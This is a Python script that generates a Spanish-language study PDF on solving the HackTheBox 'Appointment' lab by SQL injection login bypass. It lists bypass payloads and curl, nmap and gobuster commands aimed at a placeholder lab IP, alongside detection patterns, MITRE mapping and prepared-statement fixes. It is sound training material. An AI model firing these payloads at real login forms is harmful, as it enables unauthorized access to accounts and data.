#!/usr/bin/env python3
"""
PDF de teoría — HTB Appointment (Tier 1)
Técnica principal: SQL Injection — Login Bypass
RedTeamLab · César Contreras · CPTS 2026
"""

import sys, os
sys.path.insert(0, os.path.dirname(__file__))
from pdf_base import *

OUTPUT = r"C:\RedTeamLab\HTB\Appointment\Teoria_SQLi_LoginBypass.pdf"

S   = make_styles()
doc = make_doc(OUTPUT)
story = []

# ── Portada ───────────────────────────────────────────────────────────────────
story.append(Spacer(1, 1.2*cm))
story.append(Paragraph("HTB Appointment — Tier 1", S["title"]))
story.append(Paragraph("SQL Injection · Login Bypass · Web Fundamentals", S["sub"]))
story.append(hr())
story.append(Paragraph(
    "Este documento cubre la teoría necesaria para resolver Appointment: "
    "qué es SQL Injection, cómo se explota un formulario de login, "
    "qué herramientas se usan, qué detecta el Blue Team, y cómo conecta con el CPTS.",
    S["body"]
))
story.append(Spacer(1, 0.5*cm))

# ── 1. Contexto de la Máquina ─────────────────────────────────────────────────
story.append(Paragraph("1. Contexto de la Máquina", S["h1"]))
story.append(hr())

data = [
    ["Campo", "Detalle"],
    ["Nombre",        "Appointment"],
    ["Tier / Fase",   "Tier 1 — Starting Point"],
    ["OS",            "Linux"],
    ["Dificultad",    "Easy"],
    ["Técnica clave", "SQL Injection — login bypass"],
    ["Herramientas",  "nmap, curl, gobuster, Burp Suite"],
    ["Vector",        "Formulario de login vulnerable a SQLi clásica sin WAF"],
]
t = Table(data, colWidths=[5.2*cm, 10.8*cm])
t.setStyle(table_style_base())
story.append(t)
story.append(Spacer(1, 0.4*cm))

story.append(Paragraph(
    "Appointment expone un servidor web con un formulario de login que construye una query SQL "
    "concatenando directamente el input del usuario. No hay WAF, no hay prepared statements. "
    "El objetivo: bypassear el login con SQL Injection y obtener la flag.",
    S["body"]
))
story.append(Paragraph(
    "⚠️  Esta es la técnica más frecuente en evaluaciones reales de aplicaciones web. "
    "Entenderla bien desde los fundamentos es crítico para el CPTS y para cualquier engagement.",
    S["warn"]
))

# ── 2. SQL Injection — Fundamentos ───────────────────────────────────────────
story.append(PageBreak())
story.append(Paragraph("2. SQL Injection — Fundamentos", S["h1"]))
story.append(hr())

story.append(Paragraph("2.1 ¿Qué es SQL Injection?", S["h2"]))
story.append(Paragraph(
    "SQL Injection (SQLi) ocurre cuando una aplicación incluye input del usuario directamente "
    "en una consulta SQL sin sanitizarlo. El atacante puede romper la estructura de la query "
    "e inyectar lógica propia, alterando el resultado o extrayendo datos.",
    S["body"]
))

story.append(Paragraph("Query vulnerable típica en un login:", S["h3"]))
for line in [
    '-- Código PHP vulnerable (backend)',
    '$query = "SELECT * FROM users WHERE username=\'".$_POST["user"]."\' AND password=\'".$_POST["pass"]."\';";',
    '',
    '-- Con input normal:',
    "SELECT * FROM users WHERE username='admin' AND password='1234';",
    '',
    '-- Con payload SQLi: usuario = admin\'--',
    "SELECT * FROM users WHERE username='admin'--' AND password='cualquier';",
    '                                              ^^^ comentario SQL: ignora el resto',
]:
    story.append(Preformatted(line, S["code"]))

story.append(Paragraph(
    "El doble guión <b>--</b> es el operador de comentario en SQL (MySQL también acepta <b>#</b>). "
    "Todo lo que sigue al comentario es ignorado por el motor de base de datos. "
    "El resultado: la condición de contraseña desaparece — el login autentica solo con el username.",
    S["body"]
))

story.append(Paragraph("2.2 Payloads clásicos de Login Bypass", S["h2"]))
story.append(Paragraph(
    "Para bypassear un login no siempre se necesita conocer credenciales. "
    "Basta con hacer que la query devuelva TRUE. Los payloads más comunes:",
    S["body"]
))

data2 = [
    ["Payload (campo usuario)", "Lógica resultante", "Cuándo funciona"],
    ["admin'--",                "Ignora password check",          "Username conocido (admin)"],
    ["' OR '1'='1'--",         "Siempre TRUE — primer registro", "Sin conocer username"],
    ["' OR 1=1#",              "Igual, con comentario MySQL #",   "MySQL/MariaDB"],
    ["admin' #",               "Ignora password — MySQL",         "Username conocido, MySQL"],
    ["') OR ('1'='1",          "Con paréntesis — sintaxis alternativa", "Queries con paréntesis"],
]
t2 = Table(data2, colWidths=[5*cm, 5.5*cm, 5.5*cm])
t2.setStyle(table_style_base())
story.append(t2)
story.append(Spacer(1, 0.3*cm))

story.append(Paragraph(
    "💡  Regla de campo: si no sabes qué motor SQL usa la app, prueba primero con <b>--</b> (ANSI), "
    "luego con <b>#</b> (MySQL). La respuesta del servidor (error vs redirección) revela el tipo.",
    S["tip"]
))

story.append(Paragraph("2.3 Anatomía del Bypass — Paso a Paso", S["h2"]))
for line in [
    "-- Input del atacante:",
    "  username: admin'--",
    "  password: cualquier_cosa",
    "",
    "-- Query resultante en el servidor:",
    "  SELECT * FROM users WHERE username='admin'--' AND password='cualquier_cosa';",
    "",
    "-- Lo que ejecuta el motor SQL:",
    "  SELECT * FROM users WHERE username='admin'",
    "  --> Devuelve fila de admin --> login exitoso",
]:
    story.append(Preformatted(line, S["code"]))

# ── 3. Reconocimiento Pre-Explotación ────────────────────────────────────────
story.append(PageBreak())
story.append(Paragraph("3. Reconocimiento Pre-Explotación", S["h1"]))
story.append(hr())

story.append(Paragraph("3.1 Nmap — Identificar Servicios Web", S["h2"]))
for line in [
    "nmap -sCV -p- --min-rate 5000 <IP> -oN nmap_appointment.txt",
    "",
    "# Qué buscar en output:",
    "# 80/tcp  open  http   Apache httpd X.X",
    "# 443/tcp open  https  (si existe)",
    "# → Si hay 80/443, hay aplicación web que enumerar",
]:
    story.append(Preformatted(line, S["code"]))

story.append(Paragraph("3.2 Gobuster — Descubrir Directorios", S["h2"]))
story.append(Paragraph(
    "Antes de atacar el login, mapear la superficie de la aplicación. "
    "Gobuster realiza fuzzing de directorios/archivos por fuerza bruta.",
    S["body"]
))
for line in [
    "gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html",
    "",
    "# Flags importantes:",
    "# -u  → URL objetivo",
    "# -w  → wordlist (common.txt para empezar, directory-list-2.3-medium.txt para más profundo)",
    "# -x  → extensiones a probar (php y html son comunes en login panels)",
    "",
    "# Output clave a notar:",
    "# /login.php    (Status: 200)",
    "# /admin/       (Status: 301 o 403)",
    "# /index.php    (Status: 200)",
]:
    story.append(Preformatted(line, S["code"]))

story.append(Paragraph("3.3 Inspección del Formulario de Login", S["h2"]))
story.append(Paragraph(
    "Antes de inyectar, entender cómo envía los datos el formulario: "
    "método HTTP (GET/POST), nombres de campos (name=), acción (action=).",
    S["body"]
))
for line in [
    "# Ver source HTML del formulario:",
    "curl -s http://<IP>/login.php | grep -A 20 '<form'",
    "",
    "# Buscar:",
    '# <form method="POST" action="/login.php">',
    '# <input type="text"     name="username">',
    '# <input type="password" name="password">',
    "",
    "# Con Burp Suite:",
    "# Interceptar el POST de login → ver raw request → modificar parámetros",
]:
    story.append(Preformatted(line, S["code"]))

# ── 4. Explotación — Login Bypass ────────────────────────────────────────────
story.append(PageBreak())
story.append(Paragraph("4. Explotación — Login Bypass", S["h1"]))
story.append(hr())

story.append(Paragraph("4.1 Probar Manualmente con curl", S["h2"]))
for line in [
    "# POST con payload SQLi en username:",
    "curl -s -X POST http://<IP>/login.php \\",
    "  -d \"username=admin'--&password=test\" \\",
    "  -L  # seguir redirecciones",
    "",
    "# Alternativa con OR 1=1:",
    "curl -s -X POST http://<IP>/login.php \\",
    "  -d \"username=' OR '1'='1'--&password=test\" \\",
    "  -L",
    "",
    "# Señales de bypass exitoso en respuesta:",
    "# - Redirección a /dashboard.php o /home.php",
    "# - Desaparece el formulario de login",
    "# - Aparece texto 'Welcome' o 'Logged in'",
]:
    story.append(Preformatted(line, S["code"]))

story.append(Paragraph("4.2 Usando Burp Suite (método recomendado)", S["h2"]))
story.append(Paragraph(
    "Burp permite interceptar, modificar y reenviar requests sin reescribir curl manualmente. "
    "Flujo básico:",
    S["body"]
))

steps = [
    "1. Abrir Burp → Proxy → Intercept ON",
    "2. Navegar a http://<IP>/login.php en el browser configurado con proxy Burp (127.0.0.1:8080)",
    "3. Ingresar cualquier credencial y hacer submit",
    "4. En Burp: ver el POST interceptado → Send to Repeater (Ctrl+R)",
    "5. En Repeater: modificar el parámetro username → username=admin'--",
    "6. Send → revisar Response: si hay redirección o cambio de contenido = bypass",
]
for s in steps:
    story.append(Paragraph(f"• {s}", S["bullet"]))
story.append(Spacer(1, 0.2*cm))

story.append(Paragraph(
    "💡  Burp Repeater es más eficiente que curl para iterar payloads: "
    "modificas el campo, das Send, ves el response — sin reescribir el comando completo.",
    S["tip"]
))

story.append(Paragraph("4.3 Obtener la Flag", S["h2"]))
story.append(Paragraph(
    "En Appointment, tras el bypass el servidor muestra la flag directamente en la página "
    "post-login o en el dashboard. En máquinas más complejas puede requerir explorar el filesystem, "
    "pero en Tier 1 generalmente está en la respuesta HTTP inmediata.",
    S["body"]
))
for line in [
    "# Si el bypass funciona, buscar en el HTML de respuesta:",
    "curl -s -X POST http://<IP>/login.php \\",
    "  -d \"username=admin'--&password=x\" -L | grep -i 'flag\\|HTB{'",
]:
    story.append(Preformatted(line, S["code"]))

# ── 5. MITRE ATT&CK ──────────────────────────────────────────────────────────
story.append(PageBreak())
story.append(Paragraph("5. MITRE ATT&CK — Mapeo de la Técnica", S["h1"]))
story.append(hr())

data3 = [
    ["Táctica", "Técnica", "ID", "Subtécnica", "Descripción"],
    ["Reconnaissance", "Active Scanning", "T1595", "T1595.002",
     "Gobuster / nmap para mapear servicios y rutas web"],
    ["Initial Access", "Exploit Public-Facing Application", "T1190", "—",
     "SQLi en login expuesto públicamente como vector de entrada"],
    ["Credential Access", "Exploitation for Credential Access", "T1212", "—",
     "Bypass de autenticación sin credenciales válidas"],
    ["Defense Evasion", "Exploitation for Defense Evasion", "T1211", "—",
     "Comentario SQL (--) para ignorar validación de password"],
]
t3 = Table(data3, colWidths=[3*cm, 4*cm, 2*cm, 2.5*cm, 4.5*cm])
t3.setStyle(table_style_base())
story.append(t3)
story.append(Spacer(1, 0.3*cm))

story.append(Paragraph(
    "Nota: T1190 es el ID principal en producción real — un formulario de login vulnerable "
    "a SQLi es literalmente una aplicación pública explotable. En el contexto del CPTS "
    "y reportes profesionales, este es el mapping correcto a usar.",
    S["body"]
))

# ── 6. Blue Team — Detección ─────────────────────────────────────────────────
story.append(Paragraph("6. Blue Team — ¿Qué se Detecta?", S["h1"]))
story.append(hr())

story.append(Paragraph("6.1 Indicadores en Logs del Servidor Web", S["h2"]))
for line in [
    "# Apache/Nginx access.log — buscar payloads SQLi en requests:",
    "POST /login.php HTTP/1.1",
    'Body: username=admin\'--&password=test',
    "",
    "# Caracteres clave que disparan alertas:",
    "# Comillas simples:  '",
    "# Doble guión:       --",
    "# Comentario #:      %23 (URL encoded)",
    "# OR, AND, UNION:    OR+1%3D1 (URL encoded)",
    "",
    "# Grep rápido en logs para detectar intentos:",
    "grep -E \"('|--|%27|%2D%2D|OR+1|UNION)\" /var/log/apache2/access.log",
]:
    story.append(Preformatted(line, S["code"]))

story.append(Paragraph("6.2 Indicadores en SIEM / IDS", S["h2"]))
detection_items = [
    "<b>WAF (ModSecurity/CloudFlare):</b> reglas SQLi detectan patrones ' OR, --, UNION SELECT en parámetros POST/GET",
    "<b>SIEM:</b> múltiples 401→200 en corto tiempo = posible fuerza bruta de payloads",
    "<b>IDS (Snort/Suricata):</b> firmas SQLi clásicas activan alertas en tráfico HTTP sin cifrar",
    "<b>App-level logging:</b> errores de SQL en logs de la app revelan el payload exacto inyectado",
]
for item in detection_items:
    story.append(Paragraph(f"• {item}", S["bullet"]))
story.append(Spacer(1, 0.3*cm))

story.append(Paragraph("6.3 Conexión con Threat Hunting (ramo actual)", S["h2"]))
story.append(Paragraph(
    "Desde la perspectiva ofensiva: un atacante que usa SQLi manual (sin sqlmap) "
    "genera MENOS ruido — sqlmap hace cientos de requests automatizados que disparan "
    "rate-limiting y firmas IDS. El bypass manual con curl/Burp es más silencioso "
    "pero requiere entender la vulnerabilidad a fondo.",
    S["body"]
))
story.append(Paragraph(
    "⚠️  En un engagement real: si hay WAF activo, SQLi manual puede fallar. "
    "Señales de WAF: respuesta 403 inmediata con payload, o respuesta genérica sin "
    "error SQL. En ese caso se necesita evasión (encoding, case variation, comments).",
    S["warn"]
))

# ── 7. Remediación ───────────────────────────────────────────────────────────
story.append(PageBreak())
story.append(Paragraph("7. Remediación — Cómo se Parchea", S["h1"]))
story.append(hr())

story.append(Paragraph(
    "Entender la remediación es obligatorio para el CPTS: el examen requiere un reporte "
    "con recomendaciones técnicas, no solo flags.",
    S["body"]
))

story.append(Paragraph("7.1 Prepared Statements (fix principal)", S["h2"]))
for line in [
    "-- VULNERABLE (concatenación directa):",
    '$query = "SELECT * FROM users WHERE username=\'".$user."\' AND password=\'".$pass."\';";',
    "",
    "-- SEGURO (prepared statement — PHP PDO):",
    '$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");',
    '$stmt->execute([$user, $pass]);',
    "",
    "-- SEGURO (MySQLi):",
    '$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");',
    '$stmt->bind_param("ss", $user, $pass);',
    '$stmt->execute();',
]:
    story.append(Preformatted(line, S["code"]))

story.append(Paragraph(
    "Los prepared statements separan el código SQL del dato. El motor SQL procesa "
    "primero la query compilada y luego inserta los parámetros como datos puros — "
    "no como código ejecutable. Un payload como <b>admin'--</b> se trata como "
    "string literal, no como SQL.",
    S["body"]
))

story.append(Paragraph("7.2 Otras mitigaciones complementarias", S["h2"]))
mitigations = [
    "<b>Input validation:</b> rechazar caracteres especiales SQL (\", ', --, ;) en campos de login",
    "<b>Least privilege DB:</b> el usuario de BD de la app no debe tener permisos de lectura en tablas de sistema",
    "<b>WAF:</b> ModSecurity con OWASP Core Rule Set detecta y bloquea SQLi conocidas",
    "<b>Error handling:</b> nunca mostrar errores SQL al cliente — revelan estructura de la BD",
    "<b>Rate limiting:</b> limitar intentos de login por IP (5-10 intentos, luego bloqueo temporal)",
]
for m in mitigations:
    story.append(Paragraph(f"• {m}", S["bullet"]))

# ── 8. Cheatsheet Rápida ─────────────────────────────────────────────────────
story.append(PageBreak())
story.append(Paragraph("8. Cheatsheet — Appointment", S["h1"]))
story.append(hr())

story.append(Paragraph("Flujo de ataque completo:", S["h2"]))
for line in [
    "# 1. Reconocimiento",
    "nmap -sCV -p- --min-rate 5000 <IP> -oN nmap.txt",
    "",
    "# 2. Enumerar directorios web",
    "gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html",
    "",
    "# 3. Identificar formulario de login",
    "curl -s http://<IP>/login.php | grep -A 20 '<form'",
    "",
    "# 4. Payload de bypass — probar en orden:",
    "# username=admin'--          (más limpio, si username es conocido)",
    "# username=' OR '1'='1'--    (sin conocer username)",
    "# username=' OR 1=1#          (MySQL con #)",
    "",
    "# 5. Ejecutar bypass",
    "curl -s -X POST http://<IP>/login.php -d \"username=admin'--&password=x\" -L",
    "",
    "# 6. Extraer flag de respuesta",
    "curl -s -X POST http://<IP>/login.php -d \"username=admin'--&password=x\" -L | grep -oE 'HTB\\{[^}]+\\}'",
]:
    story.append(Preformatted(line, S["code"]))

story.append(Spacer(1, 0.3*cm))
story.append(Paragraph("Operadores SQL útiles para bypass:", S["h2"]))
data4 = [
    ["Operador / Sintaxis", "Motor SQL", "Efecto"],
    ["--",              "ANSI, MySQL, MSSQL",  "Comentario de línea — ignora resto de query"],
    ["#",               "MySQL, MariaDB",       "Comentario alternativo MySQL"],
    ["/* */",           "Todos",                "Comentario de bloque"],
    ["OR 1=1",          "Todos",                "Condición siempre verdadera"],
    ["' OR 'x'='x",    "Todos",                "Condición verdadera sin OR numérico"],
    ["SLEEP(5)",        "MySQL",                "Blind SQLi — delay para confirmar inyección"],
    ["WAITFOR DELAY",   "MSSQL",                "Equivalente a SLEEP en SQL Server"],
]
t4 = Table(data4, colWidths=[4.5*cm, 4.5*cm, 7*cm])
t4.setStyle(table_style_base())
story.append(t4)

# ── 9. Conexión CPTS ─────────────────────────────────────────────────────────
story.append(Spacer(1, 0.5*cm))
story.append(Paragraph("9. Conexión con CPTS y Mercado Laboral", S["h1"]))
story.append(hr())

story.append(Paragraph(
    "SQLi está cubierta en el módulo <b>SQL Injection Fundamentals</b> del HTB Academy "
    "Penetration Tester Path — uno de los módulos obligatorios para el CPTS. "
    "Lo que practicas en Appointment es exactamente lo que el examen espera que domines.",
    S["body"]
))

connections = [
    "<b>CPTS Exam:</b> SQLi en aplicaciones web es parte del scope. Se espera identificar, explotar y documentar correctamente",
    "<b>OWASP Top 10:</b> Injection (A03:2021) — sigue siendo top 3 en vulnerabilidades web más frecuentes",
    "<b>Engagement real (Proyecto Cóndor):</b> formularios de login sin prepared statements son extremadamente comunes en software legado chileno / latinoamericano",
    "<b>Reporte:</b> documentar SQLi requiere: payload exacto + query resultante + evidencia (screenshot/curl output) + impacto de negocio + remediación",
]
for c in connections:
    story.append(Paragraph(f"• {c}", S["bullet"]))

story.append(Spacer(1, 0.4*cm))
story.append(Paragraph(
    "💡  Después de Appointment, la progresión natural es Sequel (MySQL directo) "
    "y luego Vaccine (SQLi + sqlmap). Cada máquina añade una capa al mismo concepto base.",
    S["tip"]
))

# ── Footer ────────────────────────────────────────────────────────────────────
story.extend(footer_line(S, "Appointment", "2026"))
doc.build(story)
print(f"PDF generado: {OUTPUT}")
